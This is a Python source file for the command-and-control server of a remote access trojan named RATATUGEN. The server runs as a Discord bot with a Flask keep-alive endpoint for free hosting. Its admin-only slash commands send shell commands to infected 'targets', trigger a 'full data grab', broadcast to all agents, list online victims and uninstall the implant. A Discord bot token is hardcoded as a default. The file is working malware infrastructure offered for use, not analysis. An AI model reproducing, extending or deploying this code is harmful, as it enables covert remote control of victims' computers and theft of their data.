"""
RATATUGEN Discord C2 Bot — deploy to Render.com as Web Service
The Flask health-check endpoint keeps the bot alive 24/7 on free tier
"""
import discord, threading, os
from flask import Flask

TOKEN = os.environ.get("BOT_TOKEN", "MTUxNDY2MDU2NjE1MTU5ODM3Mg.GHDMYF.CbgDe1fkPp_5jkkPf63pkiYA-zqqvhSVbTU7gI")
ADMIN_ID = 1145707087666626670
CHANNEL_ID = 1514625087129780284

# Flask health-check (keeps Render from sleeping)
app = Flask(__name__)
@app.route('/')
def home():
    return "RATATUGEN C2 Online"

# Discord bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
bot = discord.Bot(intents=intents)
connected = {}

@bot.event
async def on_ready():
    print(f"[C2] Online: {bot.user}")

@bot.event
async def on_message(msg):
    if msg.author.bot: return
    if msg.channel.id == CHANNEL_ID and msg.content.startswith("[RAT-"):
        cid = msg.content.split()[0].strip("[] ")
        connected[cid] = discord.utils.utcnow()
        return
    if msg.author.id != ADMIN_ID: return
    await bot.process_commands(msg)

@bot.slash_command(name="sh", description="Run shell command on target")
async def shell(ctx, client_id: discord.Option(str, "Agent ID"), command: discord.Option(str, "Command")):
    if ctx.author.id != ADMIN_ID: return await ctx.respond("Access denied", ephemeral=True)
    ch = bot.get_channel(CHANNEL_ID)
    if ch:
        await ch.send(f"`CMD:{client_id}` ```\n{command}\n```")
        await ctx.respond(f"Sent to {client_id}", ephemeral=True)

@bot.slash_command(name="grab", description="Full data grab")
async def grab(ctx, client_id: discord.Option(str, "Agent ID")):
    if ctx.author.id != ADMIN_ID: return await ctx.respond("Access denied", ephemeral=True)
    ch = bot.get_channel(CHANNEL_ID)
    if ch:
        await ch.send(f"`CMD:{client_id}` ```\nGRAB_ALL\n```")
        await ctx.respond(f"Grab triggered", ephemeral=True)

@bot.slash_command(name="all", description="Broadcast to all agents")
async def all_cmd(ctx, command: discord.Option(str, "Command")):
    if ctx.author.id != ADMIN_ID: return await ctx.respond("Access denied", ephemeral=True)
    ch = bot.get_channel(CHANNEL_ID)
    if ch:
        await ch.send(f"`CMD:*` ```\n{command}\n```")
        await ctx.respond(f"Broadcast sent", ephemeral=True)

@bot.slash_command(name="uninstall", description="Remove RAT from target")
async def uninstall(ctx, client_id: discord.Option(str, "Agent ID")):
    if ctx.author.id != ADMIN_ID: return await ctx.respond("Access denied", ephemeral=True)
    ch = bot.get_channel(CHANNEL_ID)
    if ch:
        await ch.send(f"`CMD:{client_id}` ```\nUNINSTALL\n```")
        await ctx.respond(f"Uninstall sent", ephemeral=True)

@bot.slash_command(name="list", description="Show online agents")
async def list_cmd(ctx):
    if ctx.author.id != ADMIN_ID: return await ctx.respond("Access denied", ephemeral=True)
    if not connected: return await ctx.respond("No agents", ephemeral=True)
    import datetime
    lines = []
    for cid, last in sorted(connected.items()):
        d = (discord.utils.utcnow() - last).total_seconds()
        s = "🟢" if d < 60 else "🟡" if d < 300 else "🔴"
        lines.append(f"{s} {cid} — {int(d)}s ago")
    await ctx.respond("\n".join(lines), ephemeral=True)

if __name__ == "__main__":
    # Start Flask in background, bot on main thread
    threading.Thread(target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000))), daemon=True).start()
    bot.run(TOKEN)